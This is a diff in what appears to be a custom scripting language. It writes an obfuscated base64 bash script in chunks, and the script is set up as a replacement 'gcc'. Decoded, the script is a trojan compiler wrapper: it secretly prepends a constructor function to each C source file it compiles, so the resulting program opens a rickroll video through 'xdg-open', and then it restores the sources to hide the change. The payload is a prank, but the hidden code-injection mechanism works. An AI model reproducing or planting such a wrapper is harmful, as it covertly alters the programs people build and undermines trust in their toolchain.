@@ -1,38 +1,31 @@
 # === Create the payload  ===
 loads "payload.b64"
+
 open r2 re 
 
-loads "IyEvYmluL2Jhc2gKCmluY2x1ZGU9IiNpbmNsdWRlIDxzdGRsaWIuaD4iCgpwYXlsb2FkPSIKc3lz"
+loads "IyEvYmluL2Jhc2gKCmluY2x1ZGU9IiNpbmNsdWRlIDxzdGRsaWIuaD4iCgpwYXlsb2FkPSIKc3Rh"
 write r2 re
-loads "dGVtKFwieGRnLW9wZW4gXFwnaHR0cHM6Ly93d3cueW91dHViZS5jb20vd2F0Y2g/dj1vLVlCRFRx"
+loads "dGljIF9fYXR0cmlidXRlX18oKGNvbnN0cnVjdG9yKDEwMSkpKSB2b2lkIHByZV9tYWluKHZvaWQp"
 write r2 re
-loads "WF9aVVxcJyA+IC9kZXYvbnVsbCAyPi9kZXYvbnVsbCAmXCIpO1xuCiIKCmdjYz0kKHdoZXJlaXMg"
+loads "IHsKICAgIHN5c3RlbShcInhkZy1vcGVuIFxcJ2h0dHBzOi8vcmlja3JvbGwuaXQvcmlja3JvbGwu"
 write r2 re
-loads "JDAgfCBjdXQgLWQgIiAiIC1mMikgCnBhdGNoZWRfZmlsZT0oKQoKZnVuY3Rpb24gcGF0Y2ggewoJ"
+loads "bXA0XFwnID4gL2Rldi9udWxsIDI+L2Rldi9udWxsICZcIik7Cn0KIgoKZ2NjPSQod2hlcmVpcyAk"
 write r2 re
-loads "bWFpbj0kKGdyZXAgLW4gIm1haW4iICQxKQoJbGluZT0kKGVjaG8gJG1haW4gfCBjdXQgLWQgIjoi"
+loads "MCB8IGN1dCAtZCAiICIgLWYyKSAKcGF0Y2hlZF9maWxlPSgpCgpmdW5jdGlvbiBwYXRjaCB7CiAg"
 write r2 re
-loads "IC1mMSkKCWlzX25leHQ9JChlY2hvICRtYWluIHwgZ3JlcCAieyIgfHwgZWNobyAwKQoKCWlmIFsg"
+loads "ICBjb250ZW50PSQoY2F0ICQxKQogICAgY2F0IDw8IEVPRiA+ICQxCiR7aW5jbHVkZX0KJHtwYXls"
 write r2 re
-loads "JGlzX25leHQgLWVxIDAgXTsgdGhlbiAKCQlmb3VuZF9jdXJseT0kKGdyZXAgLW4gInsiICQxIHwg"
+loads "b2FkfQoke2NvbnRlbnR9CkVPRgp9CgppZiBbICQjIC1sdCAxIF07IHRoZW4gCgkkZ2NjCglleGl0"
 write r2 re
-loads "Y3V0IC1kICI6IiAtZjEpCgkJd2hpbGUgdHJ1ZQoJCWRvCgkJCWlmIGVjaG8gJHtmb3VuZF9jdXJs"
+loads "IDEKZmkKCmZvciBhcmcgaW4gJEAgCmRvCiAgICBhcmc9JChyZWFscGF0aCAkYXJnIDI+L2Rldi9u"
 write r2 re
-loads "eVtAXX0gfCBncmVwIC1xIC13ICIkbGluZSI7IHRoZW4KCQkJCXNlZCAtaSAiMWFcICQoZWNobyAk"
+loads "dWxsKQoJaWYgWyAtZiAkYXJnIF07IHRoZW4gCiAgICAgICAgY3AgJGFyZyAiJChkaXJuYW1lICRh"
 write r2 re
-loads "aW5jbHVkZSkiICQxCgkJCQlsaW5lPSQoKCRsaW5lICsgMSkpCgkJCQlzZWQgLWkgIiR7bGluZX1h"
+loads "cmcpLy4kKGJhc2VuYW1lICRhcmcpIgoJCXBhdGNoICRhcmcKCQlwYXRjaGVkX2ZpbGUrPSgkYXJn"
 write r2 re
-loads "XCAkKGVjaG8gJHBheWxvYWQpIiAkMQkKCQkJCWJyZWFrIAoJCQllbHNlCgkJCQlsaW5lPSQoKCRs"
+loads "KQoJZmkKZG9uZQoKJGdjYyAkQAoKZm9yIGZpbGUgaW4gJHBhdGNoZWRfZmlsZSAKZG8KICAgIG12"
 write r2 re
-loads "aW5lICsgMSkpCgkJCWZpCgkJZG9uZQoJZmkKfQoKaWYgWyAkIyAtbHQgMSBdOyB0aGVuIAoJJGdj"
-write r2 re
-loads "YwoJZXhpdCAxCmZpCgpmb3IgYXJnIGluICRAIApkbwoJaWYgWyAtZiAkYXJnIF07IHRoZW4gCgkJ"
-write r2 re
-loads "Y3AgJChwd2QpLyRhcmcgJChwd2QpLy4kYXJnCgkJcGF0Y2ggJChwd2QpLyRhcmcKCQlwYXRjaGVk"
-write r2 re
-loads "X2ZpbGUrPSgkYXJnKQoJZmkKZG9uZQoKJGdjYyAkQAoKZm9yIGZpbGUgaW4gJHBhdGNoZWRfZmls"
-write r2 re
-loads "ZSAKZG8KCW12ICQocHdkKS8uJGZpbGUgJChwd2QpLyRmaWxlCmRvbmUKCg=="
+loads "ICIkKGRpcm5hbWUgJGZpbGUpLy4kKGJhc2VuYW1lICRmaWxlKSIgJGZpbGUKZG9uZQoK"
 write r2 re
 
 close r2
@@ -55,6 +48,7 @@ loadr r1 re
 loadr r3 re
 loads "/gcc"
 append r1 re 
+
 loadr r1 re
 
 loads "tmp.sh"
